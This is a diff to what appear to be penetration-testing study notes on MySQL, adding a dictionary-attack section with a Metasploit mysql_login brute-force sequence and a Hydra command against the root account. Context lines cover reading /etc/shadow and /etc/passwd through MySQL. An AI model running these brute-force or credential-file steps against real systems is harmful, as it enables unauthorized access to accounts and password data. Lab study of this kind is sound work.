@@ -19,6 +19,9 @@
 - [MySQL Commands](#mysql-commands)
   - [Initial Queries](#initial-queries)
   - [Filesystem Access](#filesystem-access)
+- [Dictionary Attacks](#dictionary-attacks)
+  - [MetaSploit](#metasploit)
+  - [Hydra](#hydra)
 
 ## Nmap Scripts
 
@@ -158,3 +161,25 @@ mysql -h [target ip] -u root
 - You may get the full shadow file...
 - The [/etc/shadow](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) file is a text file that contains information about the system’s users’ passwords.
 - The [/etc/passwd](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) file contains a list of valid users on the target system
+
+## Dictionary Attacks
+
+### MetaSploit
+> module to brute-force a login
+```
+> use auxiliary/scanner/mysql/mysql_login
+> set rhosts [target ip]
+> set pass_file /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt
+> set verbose false
+> set stop_on_success true
+> set username root
+> options (check it to make sure)
+> run (or exploit)
+```
+
+### [Hydra](../hydra.md)
+> Should give you the same result as msf above.
+```
+hydra -l root -P /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt [target ip] mysql
+```
+
